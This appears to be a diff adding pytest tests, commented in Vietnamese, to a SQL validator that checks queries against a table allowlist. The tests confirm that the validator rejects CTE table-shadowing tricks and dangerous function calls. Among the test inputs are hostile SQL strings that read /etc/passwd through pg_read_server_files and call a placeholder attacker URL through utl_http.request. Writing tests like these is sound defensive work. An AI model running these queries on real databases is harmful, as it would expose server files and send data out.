@@ -82,6 +82,30 @@ def test_duckdb_dialect():
             check_select(bad, **kw)
 
 
+@pytest.mark.parametrize("sql", [
+    # CTE trùng tên bảng: bảng bên trong là bảng THẬT, không được coi là CTE để né allowlist
+    "WITH users AS (SELECT * FROM public.users) SELECT * FROM users",
+    "WITH users AS (SELECT * FROM users) SELECT * FROM users",
+    "SELECT * FROM (WITH users AS (SELECT 1 AS a) SELECT * FROM users) x CROSS JOIN users",
+    "WITH a AS (SELECT * FROM users), users AS (SELECT 1 AS x) SELECT * FROM a",
+    # hàm nguy hiểm không có trong danh sách tên đơn lẻ, chặn theo tiền tố
+    "SELECT pg_sleep_for('5 minutes')",
+    "SELECT lo_get(1234)",
+    "SELECT pg_read_server_files('/etc/passwd')",
+    "SELECT utl_http.request('http://attacker') FROM dwh.fact_sales",
+])
+def test_cte_shadowing_and_function_prefixes_rejected(sql):
+    with pytest.raises(UnsafeSQLError):          # chỉ được đọc fact_sales; "users" là bảng bị cấm
+        check_select(sql, dialect="postgres", allowed_tables=["dwh.fact_sales"], default_schema="dwh")
+
+
+def test_legit_ctes_still_ok():
+    check_select("WITH RECURSIVE r AS (SELECT 1 AS n UNION ALL SELECT n + 1 FROM r WHERE n < 3) SELECT * FROM r", **PG)
+    check_select("WITH b AS (SELECT 1 AS x), a AS (SELECT * FROM b) SELECT * FROM a", **PG)
+    q = check_select("WITH t AS (SELECT * FROM fact_sales) SELECT * FROM t AS x JOIN t AS y ON x.id = y.id", **PG)
+    assert q.tables == ("dwh.fact_sales",)
+
+
 def test_specific_table_allowlist():
     kw = {"dialect": "postgres", "allowed_tables": ["public.orders"], "default_schema": "public"}
     check_select("SELECT * FROM orders", **kw)
